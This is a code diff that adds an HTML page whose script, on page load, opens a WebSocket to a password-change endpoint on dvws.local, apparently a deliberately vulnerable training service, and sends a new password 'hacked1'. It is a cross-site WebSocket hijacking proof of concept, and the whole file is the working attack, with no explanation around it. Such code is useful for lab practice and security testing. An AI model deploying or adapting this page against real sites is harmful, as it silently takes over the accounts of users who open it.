@@ -1,0 +1,25 @@
+<html>
+<body>
+<script>
+document.addEventListener("DOMContentLoaded", function(event) { 
+	var ws = new WebSocket("ws://dvws.local:8080/change-password");
+	ws.onopen = function(ev) {
+		console.log("connect");
+	    ws.send('{"npass":"hacked1"}');
+	};
+	ws.onclose = function(ev) {
+		console.log("disconnect");
+	};
+	ws.onclose = function(ev) {
+		console.log('Disconnected from server');
+	};
+	ws.onmessage = function(ev) {
+		alert("Message " + ev.data);
+	};
+	ws.onerror = function(ev) {
+		alert("Error " + ev.data);
+	}; 
+});
+</script>
+</body>
+</html>
